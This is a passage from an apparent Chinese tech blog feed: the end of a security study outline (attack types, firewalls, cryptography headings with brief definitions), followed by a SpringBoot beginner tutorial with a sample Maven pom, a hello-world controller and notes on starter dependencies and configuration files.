title="缓冲区溢出"></a>缓冲区溢出</h2><blockquote><p>恶意将过量的数据写入缓冲区而导致缓冲区无法容纳。</p></blockquote><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><blockquote><p>针对网站攻击最流行的行为。</p><p>向 Web 应用程序传递 SQL 命令，并使得服务器执行。</p></blockquote><h2 id="XSS-注入（跨站脚本注入）"><a href="#XSS-注入（跨站脚本注入）" class="headerlink" title="XSS 注入（跨站脚本注入）"></a>XSS 注入（跨站脚本注入）</h2><blockquote><p>将客户端脚本注入用户查看的 Web 页面中（交互区域）。</p><p>用户访问该部分时，执行的是攻击者的脚本，而不是站点预期的功能。</p></blockquote><h2 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><h2 id="Cookie-投毒"><a href="#Cookie-投毒" class="headerlink" title="Cookie 投毒"></a>Cookie 投毒</h2><h2 id="URL-劫持"><a href="#URL-劫持" class="headerlink" title="URL 劫持"></a>URL 劫持</h2><h2 id="无线攻击"><a href="#无线攻击" class="headerlink" title="无线攻击"></a>无线攻击</h2><h5 id="双面恶魔攻击"><a href="#双面恶魔攻击" class="headerlink" title="双面恶魔攻击"></a>双面恶魔攻击</h5><h5 id="WPS-攻击"><a href="#WPS-攻击" class="headerlink" title="WPS 攻击"></a>WPS 攻击</h5><h2 id="口令破解"><a href="#口令破解" class="headerlink" title="口令破解"></a>口令破解</h2><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><blockquote><p>网络边界处，根据某些参数（数据包大小、src IP、protocol、port）<code>过滤</code>入站数据包。</p></blockquote><ul><li>内置防火墙的路由器（思科等）</li><li>专门运行防火墙软件的专用路由器</li></ul><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><h4 id="数据包过滤"><a href="#数据包过滤" class="headerlink" title="数据包过滤"></a>数据包过滤</h4><h4 id="全状态数据包过滤"><a href="#全状态数据包过滤" class="headerlink" title="全状态数据包过滤"></a>全状态数据包过滤</h4><h4 id="应用网关"><a href="#应用网关" class="headerlink" title="应用网关"></a>应用网关</h4><h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><h4 id="双宿主主机"><a href="#双宿主主机" class="headerlink" title="双宿主主机"></a>双宿主主机</h4><h4 id="基于路由器的防火墙"><a href="#基于路由器的防火墙" class="headerlink" title="基于路由器的防火墙"></a>基于路由器的防火墙</h4><h4 id="屏蔽主机"><a href="#屏蔽主机" class="headerlink" title="屏蔽主机"></a>屏蔽主机</h4><h2 id="IDS（入侵检测系统）"><a href="#IDS（入侵检测系统）" class="headerlink" title="IDS（入侵检测系统）"></a>IDS（入侵检测系统）</h2><h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><h2 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL&#x2F;TLS"></a>SSL&#x2F;TLS</h2><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><h2 id="TOR"><a href="#TOR" class="headerlink" title="TOR"></a>TOR</h2><h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h2><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><blockquote><p>传统加密，单钥加密。20世纪70年代之前（公钥密码产生之前）的唯一加密方式。</p></blockquote><h3 id="凯撒密码（Caesar）"><a href="#凯撒密码（Caesar）" class="headerlink" title="凯撒密码（Caesar）"></a>凯撒密码（Caesar）</h3><h3 id="单表代替密码"><a href="#单表代替密码" class="headerlink" title="单表代替密码"></a>单表代替密码</h3><h3 id="多表代替密码"><a href="#多表代替密码" class="headerlink" title="多表代替密码"></a>多表代替密码</h3><h3 id="Play-Fair-密码"><a href="#Play-Fair-密码" class="headerlink" title="Play Fair 密码"></a>Play Fair 密码</h3><h3 id="Hill-密码"><a href="#Hill-密码" class="headerlink" title="Hill 密码"></a>Hill 密码</h3><h3 id="栅栏密码（rail-fence）"><a href="#栅栏密码（rail-fence）" class="headerlink" title="栅栏密码（rail fence）"></a>栅栏密码（rail fence）</h3><h2 id="Atbash-密码"><a href="#Atbash-密码" class="headerlink" title="Atbash 密码"></a>Atbash 密码</h2><h3 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h3><h4 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h4><h4 id="Feistel-密码"><a href="#Feistel-密码" class="headerlink" title="Feistel 密码"></a>Feistel 密码</h4><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><h5 id="双重-DES"><a href="#双重-DES" class="headerlink" title="双重 DES"></a>双重 DES</h5><h4 id="三重-DES"><a href="#三重-DES" class="headerlink" title="三重 DES"></a>三重 DES</h4><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><h3 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h3><h3 id="RSA-算法"><a href="#RSA-算法" class="headerlink" title="RSA 算法"></a>RSA 算法</h3><h3 id="Diffie-Hellman-密钥交换"><a href="#Diffie-Hellman-密钥交换" class="headerlink" title="Diffie-Hellman 密钥交换"></a>Diffie-Hellman 密钥交换</h3><h3 id="RlGamal-密码体制"><a href="#RlGamal-密码体制" class="headerlink" title="RlGamal 密码体制"></a>RlGamal 密码体制</h3><h3 id="椭圆曲线密码"><a href="#椭圆曲线密码" class="headerlink" title="椭圆曲线密码"></a>椭圆曲线密码</h3><h2 id="密码学哈希函数"><a href="#密码学哈希函数" class="headerlink" title="密码学哈希函数"></a>密码学哈希函数</h2><h3 id="消息认证-数字签名"><a href="#消息认证-数字签名" class="headerlink" title="消息认证 &amp; 数字签名"></a>消息认证 &amp; 数字签名</h3><h3 id="安全哈希算法-SHA-512"><a href="#安全哈希算法-SHA-512" class="headerlink" title="安全哈希算法 SHA-512"></a>安全哈希算法 SHA-512</h3><h3 id="SHA-3"><a href="#SHA-3" class="headerlink" title="SHA-3"></a>SHA-3</h3><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><h3 id="Elgamal-数字签名"><a href="#Elgamal-数字签名" class="headerlink" title="Elgamal 数字签名"></a>Elgamal 数字签名</h3><h3 id="Schnorr-数字签名"><a href="#Schnorr-数字签名" class="headerlink" title="Schnorr 数字签名"></a>Schnorr 数字签名</h3><h4 id="NIST-数字签名"><a href="#NIST-数字签名" class="headerlink" title="NIST 数字签名"></a>NIST 数字签名</h4><h3 id="椭圆曲线数字签名"><a href="#椭圆曲线数字签名" class="headerlink" title="椭圆曲线数字签名"></a>椭圆曲线数字签名</h3><h3 id="RSA-PSS-数字签名"><a href="#RSA-PSS-数字签名" class="headerlink" title="RSA-PSS 数字签名"></a>RSA-PSS 数字签名</h3><h2 id="轻量级密码"><a href="#轻量级密码" class="headerlink" title="轻量级密码"></a>轻量级密码</h2><h3 id="关联数据认证加密"><a href="#关联数据认证加密" class="headerlink" title="关联数据认证加密"></a>关联数据认证加密</h3><h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><h3 id="消息认证码"><a href="#消息认证码" class="headerlink" title="消息认证码"></a>消息认证码</h3><h3 id="非对成密码算法"><a href="#非对成密码算法" class="headerlink" title="非对成密码算法"></a>非对成密码算法</h3><h2 id="后量子密码"><a href="#后量子密码" class="headerlink" title="后量子密码"></a>后量子密码</h2><h3 id="量子计算"><a href="#量子计算" class="headerlink" title="量子计算"></a>量子计算</h3><h3 id="格密码算法"><a href="#格密码算法" class="headerlink" title="格密码算法"></a>格密码算法</h3><h3 id="编码密码算法"><a href="#编码密码算法" class="headerlink" title="编码密码算法"></a>编码密码算法</h3><h3 id="多变量多项式密码算法"><a href="#多变量多项式密码算法" class="headerlink" title="多变量多项式密码算法"></a>多变量多项式密码算法</h3><h3 id="哈希签名算法"><a href="#哈希签名算法" class="headerlink" title="哈希签名算法"></a>哈希签名算法</h3>]]></content>
      
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot速通</title>
      <link href="/2024/05/21/SpringBoot%E9%80%9F%E9%80%9A/"/>
      <url>/2024/05/21/SpringBoot%E9%80%9F%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>简化 Spring 的开发流程，加速开发过程。</p><p>文档：<a href="https://docs.spring.io/spring-boot/docs/2.1.13.RELEASE/reference/html/">https://docs.spring.io/spring-boot/docs/2.1.13.RELEASE/reference/html/</a></p><h3 id="Spring-框架的特性"><a href="#Spring-框架的特性" class="headerlink" title="Spring 框架的特性"></a>Spring 框架的<strong>特性</strong></h3><p>非侵入式：基于Spring开发的应用中的对象可以<code>不依赖</code>于Spring的API</p><p>控制反转：IOC——Inversion of Control，指的是将 <code>对象的创建权</code> 交给 Spring 去创建。</p><p>使用 Spring 之前，对象的创建都是由我们自己在代码中new创建。</p><p>而使用 Spring 之后。<code>对象的创建都是给了 Spring 框架</code>，<strong>需要用时从Bean的容器中获取即可，这样便简化了开发工作</strong>。</p><ul><li><p>Spring框架管理这些Bean的创建工作，即由用户管理Bean转变为框架管理Bean</p><ul><li>这个就叫<strong>控制反转 - Inversion of Control (IoC)</strong></li></ul></li><li><p>Spring 框架托管创建的Bean放在哪里呢？ </p><ul><li>这便是<strong>IoC Container</strong>;</li></ul></li><li><p>Spring 框架为了更好让用户配置Bean，必然会引入**不同方式来配置Bean？ **</p><ul><li><strong>这便是xml配置，Java配置，注解配置</strong>等支持</li></ul></li><li><p>Spring 框架既然接管了Bean的生成</p><ul><li>必然需要<strong>管理整个Bean的生命周期</strong></li></ul></li><li><p>应用程序代码从Ioc Container中获取依赖的Bean，注入到应用程序中</p><ul><li>这个过程叫 <strong>依赖注入(Dependency Injection，DI)</strong> ； </li><li>所以说控制反转是通过依赖注入实现的，其实它们是同一个概念的不同角度描述。</li><li>通俗来说就是<strong>IoC是设计思想，DI是实现方式</strong></li></ul></li></ul><p>在依赖注入时，有哪些方式呢？这就是构造器方式，@Autowired, @Resource, @Qualifier… 同时Bean之间存在依赖（可能存在先后顺序问题，以及<strong>循环依赖问题</strong>等）</p><blockquote><p>参考：<a href="https://pdai.tech/md/spring/spring-x-framework-helloworld.html">https://pdai.tech/md/spring/spring-x-framework-helloworld.html</a></p></blockquote><p>依赖注入：DI——Dependency Injection，是指依赖的对象<code>不需要手动调用 setXX 方法去设置</code>，而是<code>通过配置赋值</code>。</p><p>面向切面编程：Aspect Oriented Programming——AOP</p><p>容器：Spring 是一个容器，因为它包含并且<code>管理应用对象的生命周期</code></p><p>组件化：Spring 实现了使用简单的组件配置组合成一个复杂的应用。在 Spring 中可以使用<code>XML</code>和<code>Java注解</code>组合这些对象。</p><p>一站式：在 IOC 和 AOP 的基础上可以整合各种企业应用的开源框架和优秀的第三方类库（实际上 Spring 自身也提供了表现层的 SpringMVC 和持久层的 Spring JDBC）</p><h5 id="Spring-的组件"><a href="#Spring-的组件" class="headerlink" title="Spring 的组件"></a>Spring 的组件</h5><p><img src="https://pdai.tech/images/spring/springframework/spring-framework-introduce-8.png" alt="img"></p><p>最重要的是 <code>Core Containers</code>。</p><ul><li>Beans：基础部分，提供 IOC 和 DI。</li><li>Core：封装 Spring 底层（资源访问、类型转换及一些常用工具类）。</li><li>Context：建立在 Core 和 Beans 模块的基础之上，<ul><li>集成 Beans 模块功能</li><li>添加资源绑定、数据验证、国际化、Java EE 支持、容器生命周期、事件传播等</li><li>ApplicationContext 接口是上下文模块的焦点。</li></ul></li><li>SpEL：表达式语言支持<ul><li>改属性值</li><li>方法调用</li><li>访问及修改数组、容器和索引器</li><li>命名变量</li><li>支持算数和逻辑运算</li><li>从 Spring 容器获取 Bean</li><li>列表投影、选择和一般的列表聚合等</li></ul></li></ul><p><code>Data Access / Integration</code></p><ul><li><p>JDBC 模块：提供一个 JDBC 样例模板</p><ul><li>消除传统冗长的 JDBC 编码</li><li>事务控制</li></ul></li><li><p>ORM 模块：提供与流行的“对象-关系”映射框架无缝集成的 API</p><ul><li>包括 JPA、JDO、Hibernate 和 MyBatis 等</li><li>使用 Spring 事务管理，无需额外控制事务</li></ul></li><li><p>OXM 模块：提供了一个支持 Object &#x2F;XML 映射的抽象层实现</p><ul><li>如 JAXB、Castor、XMLBeans、JiBX 和 XStream</li><li>将 Java 对象映射成 XML 数据，或者将XML 数据映射成 Java 对象</li></ul></li><li><p>JMS 模块：指 Java 消息服务提供一套 “消息生产者、消息消费者”模板</p><ul><li>用于更加简单的使用 JMS，JMS 用于用于在两个应用程序之间，或分布式系统中发送消息，进行异步通信。</li></ul></li><li><p>Transactions 事务模块：支持编程和声明式事务管理</p></li></ul><p><code>Web  模块</code></p><ul><li><p>Web：提供了基本的 Web 开发集成特性</p><ul><li>多文件上传</li><li>使用的 Servlet 监听器的 IOC 容器初始化</li><li>Web 应用上下文</li></ul></li><li><p>Servlet：提供了一个 Spring MVC Web 框架实现</p><ul><li>基于注解的请求资源注入</li><li>更简单的数据绑定</li><li>数据验证等</li></ul></li><li><p>WebSocket</p></li><li><p>Portlet</p></li></ul><h2 id="Spring-缺点"><a href="#Spring-缺点" class="headerlink" title="Spring 缺点"></a>Spring 缺点</h2><ol><li>配置繁琐（XML 繁琐）</li><li>以来繁琐（maven 管理繁琐，jar 包版本兼容问题）</li></ol><p>SpringBoot 特性</p><ul><li>自动配置，写很少的配置文件</li><li>起步依赖，将坐标打包到一起</li></ul><h2 id="构建-SpringBoot-项目"><a href="#构建-SpringBoot-项目" class="headerlink" title="构建 SpringBoot 项目"></a>构建 SpringBoot 项目</h2><h3 id="方式一：通过-maven-手工配置"><a href="#方式一：通过-maven-手工配置" class="headerlink" title="方式一：通过 maven 手工配置"></a>方式一：通过 maven 手工配置</h3><ol><li>创建 maven 项目</li><li>导入 SpringBoot 起步依赖</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>定义 controller</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello SpringBoot!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>编写引导类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 引导类，springboot 工程的入口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(HelloApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>启动测试</li></ol><h3 id="IDEA-内置-springboot-initializer-构建"><a href="#IDEA-内置-springboot-initializer-构建" class="headerlink" title="IDEA 内置 springboot initializer 构建"></a>IDEA 内置 springboot initializer 构建</h3><p>如果是使用 spring intializer 的创建方式的话可以手动选择需要的依赖。</p><h3 id="spirng-官网项目模板构建"><a href="#spirng-官网项目模板构建" class="headerlink" title="spirng 官网项目模板构建"></a>spirng 官网项目模板构建</h3><p>也可以使用 <a href="https://start.spring.io/">https://start.spring.io/</a> 选择想要的依赖，直接生成 springboot 工程，下载，运行。</p><h2 id="springboot-起步依赖原理分析"><a href="#springboot-起步依赖原理分析" class="headerlink" title="springboot 起步依赖原理分析"></a>springboot 起步依赖原理分析</h2><h5 id="spring-boot-starter-parent"><a href="#spring-boot-starter-parent" class="headerlink" title="spring-boot-starter-parent"></a>spring-boot-starter-parent</h5><p>个人项目依赖一个 parent，即 <code>spring-boot-starter-parent</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure><p>追溯源码，发现 spring-boot-starter-parent 依赖 <code>spring-boot-dependencies</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure><p>继续追溯，发现 spring-boot-dependencies 就没有 parent 了。</p><p>在个人项目 <code>pom.xml</code> 中，<code>spring-boot-starter-web</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>并没有指定版本信息，因为已经在父工程 spring-boot-dependencies中指定了。</p><p>dependencyManagement 是版本锁定。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span>      </span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-webflux<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这些依赖不会造成任何冲突，组合了一套最优的技术版本搭配。</p><h5 id="spring-boot-starter-web"><a href="#spring-boot-starter-web" class="headerlink" title="spring-boot-starter-web"></a>spring-boot-starter-web</h5><p>点进去可以看到它依赖的坐标信息。</p><p>这些是没有版本锁定的。</p><p><code>我们的项目</code> —依赖—&gt; <code>spring-boot-starter</code> —依赖—&gt;  <code>spring-boot-starter、spring-boot-starter-json、spring-boot-starter-tomcat、spring-web、spring-webmvc</code>。</p><p>因此，<code>我们的项目</code> —依赖—&gt; <code>spring-boot-starter、spring-boot-starter-json、spring-boot-starter-tomcat、spring-web、spring-webmvc</code>。</p><p>这就是<em>依赖传递</em>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-json<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SpringBoot-配置"><a href="#SpringBoot-配置" class="headerlink" title="SpringBoot 配置"></a>SpringBoot 配置</h2><h3 id="配置文件分类"><a href="#配置文件分类" class="headerlink" title="配置文件分类"></a>配置文件分类</h3><p>SpringBoot 是基于约定的，很多配置有默认值。</p><p>如果想要自定义覆盖默认，可以使用 <code>application.properties</code> 或 <code>application.yaml</code>  或 <code>application.yml</code> 进行配置。</p><h5 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h5><p>key-value 形式。</p><p>位于 <code>/src/resources/application.properties</code>。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">9090</span></span><br></pre></td></tr></table></figure><h5 id="yaml-yml"><a href="#yaml-yml" class="headerlink" title="yaml 